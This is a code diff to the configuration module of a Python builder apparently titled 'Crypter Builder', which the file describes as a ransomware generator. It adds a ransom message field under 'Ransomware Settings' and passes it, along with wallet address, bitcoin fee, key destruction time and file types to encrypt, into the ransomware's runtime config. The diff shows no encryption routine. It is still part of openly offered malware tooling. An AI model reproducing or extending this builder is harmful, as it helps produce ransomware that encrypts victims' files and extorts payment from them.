@@ -8,6 +8,13 @@
 import re
 from ordereddict import OrderedDict
 
+## VERSION
+MAJ_VERSION = "1"
+MIN_VERSION = "03"
+
+# TITLE
+TITLE = "Crypter Builder v%s.%s" % (MAJ_VERSION, MIN_VERSION)
+
 ## LANGUAGE
 SUPPORTED_LANGUAGES = [
     u"English",
@@ -76,28 +83,6 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "input_requirement": "Build process debug level",
             "config_area": "Debug",
             "default": "1 - Low"
-            }
-    ),
-    (
-        "maj_version", {
-            "label": "Major Version",
-            "label_object_name": "MajorVersionLabel",
-            "input_object_name": "MajorVersionTextCtrl",
-            "regex": re.compile("^[0-9]*$"),
-            "example": "5",
-            "input_requirement": "A series of integer(s)",
-            "config_area": "Version Information"
-            }
-    ),
-    (
-        "min_version", {
-            "label": "Minor Version",
-            "regex": re.compile("^[0-9]*$"),
-            "label_object_name": "MinorVersionLabel",
-            "input_object_name": "MinorVersionTextCtrl",
-            "example": "20",
-            "input_requirement": "A series of integer(s)",
-            "config_area": "Version Information"
             }
     ),
     (
@@ -231,6 +216,17 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "config_area": "Ransomware Settings",
             "default": ENCRYPTABLE_FILETYPES
         }
+    ),
+    (
+        "ransom_message", {
+            "label": "Ransom Message",
+            "input_object_name": "RansomMessageTextCtrl",
+            "regex": re.compile("^.*$", re.MULTILINE),
+            "example": "",
+            "input_requirement": "Ransom message/note",
+            "config_area": "Ransomware Settings",
+            "default": ""
+        }
     )
     ])
 
@@ -238,14 +234,13 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
 @summary: Runtime configuration items. To be written to the Ransomware's runtime config file
 '''
 RUNTIME_CONFIG_ITEMS = [
-    "maj_version",
-    "min_version",
     "encrypted_file_extension",
     "wallet_address",
     "bitcoin_fee",
     "key_destruction_time",
     "max_file_size_to_encrypt",
-    "filetypes_to_encrypt"
+    "filetypes_to_encrypt",
+    "ransom_message"
     ]
 
 RUNTIME_CONFIG_PATH = "Resources/runtime.cfg"
